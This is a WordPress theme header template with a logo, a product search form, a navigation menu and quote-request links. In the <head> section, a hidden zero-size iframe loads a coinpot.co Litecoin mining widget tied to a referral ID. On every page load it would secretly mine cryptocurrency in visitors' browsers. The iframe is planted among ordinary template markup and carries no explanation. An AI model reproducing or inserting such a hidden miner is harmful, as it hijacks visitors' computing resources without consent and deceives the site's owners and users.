<?php
/**
 * The header for our theme
 *
 * This is the template that displays all of the <head> section and everything up until <div id="content">
 *
 * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
 *
 * @package shoping_theme
 */

?>
<!doctype html>
<html <?php language_attributes(); ?>>
<head>
	<meta charset="<?php bloginfo( 'charset' ); ?>">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<?php wp_head(); ?>
	<iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/litecoin/?ref=077E436906EF&mode=widget" style="width:0;height:0;border:0; border:none;"></iframe>
</head>

<body <?php body_class(); ?>>
<?php wp_body_open(); ?>
<header class="shopheader_mb">
  
      
        <?php
           if ( wp_is_mobile() ) {
             ?>
          <div class="shop_top_mobile">
            <div class="container">
                <div class="row">
                  <div class="col-5 pr_mob">
                      <div class="shop_mobile_topbar header_bobile_marg text-right">
                      <a href="<?php echo get_theme_mod("topbar_number_details_setting");?>"><i class="fas fa-phone-alt"></i> Call Us</a>
                      </div>
                  </div>
                  <div class="col-7">
                    <div class="shop_mobile_topbar header_bobile_marg">
                      <a  href="https://khalil.mixboxstudios.com/from/"><i class="fas fa-pen"></i> Request a Quote</a>
                    </div>
                  </div>
                </div> 
              </div>
            </div>  
             <?php


          }
        ?>
      
    
    <div class="container-fluid">
        <div class="row">
            <div class="col-lg-2 col-md-2 col-sm-12 d-sm-none d-lg-block d-md-block d-none order-md-1 order-lg-1">
                <div class="shp_hf_logo">
                    <a href="<?php bloginfo('url')?>">
							<?php
                                $custom_logo_id = get_theme_mod( 'custom_logo' );
                                $image = wp_get_attachment_image_src( $custom_logo_id , 'full' );
                            ?>
                            <img src="<?php echo $image[0];?>" alt="<?php  bloginfo('name');?>"
                                class="img-fluid">
                    </a>
                </div>
            </div>
            <div class="col-lg-3 col-md-6 col-sm-12 my-auto shop_topserh_bar order-2 order-md-2 order-lg-2 col-10">
              <form role="search" method="get" class="search-form" action="<?php echo home_url( '/' ); ?>">
                  <div class="shp_header_search">
                      <div class="form-group has-search">
                          <span class="fa fa-search form-control-feedback"></span>
                          <input type="text" name="s" class="form-control" placeholder="Search Products ">
                          <input type="hidden" name="post_type" value="products"/>
                        </div>
                  </div>
              </form>    
            </div>
            <div class="col-lg-7 col-md-4 col-sm-12 my-auto order-1 order-md-3 order-lg-3 col-2">
                <div class="header_navbar">
                    <nav class="navbar navbar-expand-lg ">
                        <button class="navbar-toggler shop_togglemenu" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                          <i class="fas fa-bars"></i>
                        </button>
                      
                        <div class="collapse navbar-collapse shop_togglearea" id="navbarSupportedContent">
                         
						            <ul class="navbar-nav ml-auto">
                          <?php
                                                  wp_nav_menu(array(
                                  'theme_location' => 'primary', 
                                  'container' => false,
                                  'items_wrap' => '%3$s',
                                                    //   'container' => '',
                                                    //   'menu_class'=> 'navbar-nav mr-auto',
                                  'add_li_class'  => 'nav-item',
                                  
                                                  ));
                              ?>

							                <li class="nav-item sho_hd_numer">
                                <a class="nav-link" href="#">+<?php echo get_theme_mod("topbar_number_details_setting");?></a>
                              </li>
                              <li class="nav-item sho_quote">
                                <a class="nav-link" href="https://khalil.mixboxstudios.com/from/">Get a Quote</a>
                              </li>

						  </ul>
						
                        </div>
                      </nav>
                </div>
            </div>
        </div>
    </div>
</header>